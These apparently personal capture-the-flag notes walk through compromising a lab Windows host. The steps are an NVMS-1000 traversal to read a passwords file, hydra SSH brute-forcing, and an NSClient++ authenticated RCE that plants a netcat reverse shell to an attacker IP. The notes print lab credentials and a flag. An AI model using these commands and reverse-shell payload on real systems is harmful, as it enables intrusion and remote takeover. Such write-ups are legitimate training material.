port 80: NVMS-1000 login page
CVE-2019-20085 -> https://www.exploit-db.com/exploits/48311

metasploit to dump useful file to have creds
-> not useful for now cuz idk which file to dump

anonymous login allowed ftp
-> Confidential.txt in Nadine user dir:

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

in nathan ftp user dir: to do

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

now can dump Passwords.txt in nathan desktop through nvms exploit in msf
> set filepath /users/nathan/desktop/passwords.txt

do not work for cvms, lets crack ssh psswd:
hydra -L users.txt -P passwords.txt 10.10.10.184 ssh
-> [22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk

user flag as Nadine:
d16c47d65bb6dc9d9df64a7777373bb9

with winPEAS (dl via curl)
C:\WINDOWS\system32\inetsrv\appcmd.exe
-> first lets try for others ports bc i never priv esc on windows

8443/tcp open  ssl/https-alt -> https://10.10.10.184:8443
seems very broken... still nmap show NSClient as the title

-> https://www.exploit-db.com/exploits/46802
cd C:\Program Files\NSClient++
nscp web -- password --display = ew2x6SsGTxjRwXOT

-> NSClient++ 0.5.2.35 - Authenticated Remote Code Execution | json/webapps/48360.txt
rename it in python script
python3 48360.py -t 10.10.10.184 -P 8443 -p ew2x6SsGTxjRwXOT -c ls
= does not work, lets go back in nsclient config file, maybe same reason that website is broken

> type nsclient.ini
```
...
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...
```

Ok so here is the reason: we need to be 127.0.0.1
lets do some port forwarding with ssh
ssh -L 8080:127.0.0.1:8443 nadine@10.10.10.184

now in browser: https://127.0.0.1:8080 -> it works!
login with `ew2x6SsGTxjRwXOT`

lets follow priv esc exploit
set up listen on 4444
create revshell and get it via curl in c:\temp
get nc64.exe too after renaming it nc.exe

on target, because site was laggy af:
curl -s -k -u admin -X PUT https://localhost:8080/api/v1/scripts/ext/scripts/evil.bat --data-binary "c:\Temp\nc.exe 10.10.14.24 4444 -e cmd.exe"
curl -s -k -u admin https://localhost:8080/api/v1/queries/evil/commands/execute?time=1m

-> shell as admin
